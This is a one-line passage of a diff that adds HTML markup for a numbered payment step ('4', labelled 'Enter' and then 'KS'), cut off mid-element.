+            <div class="pay-step"><div class="pay-step-dot">4</div><div class="pay-step-label">Enter<br>KS
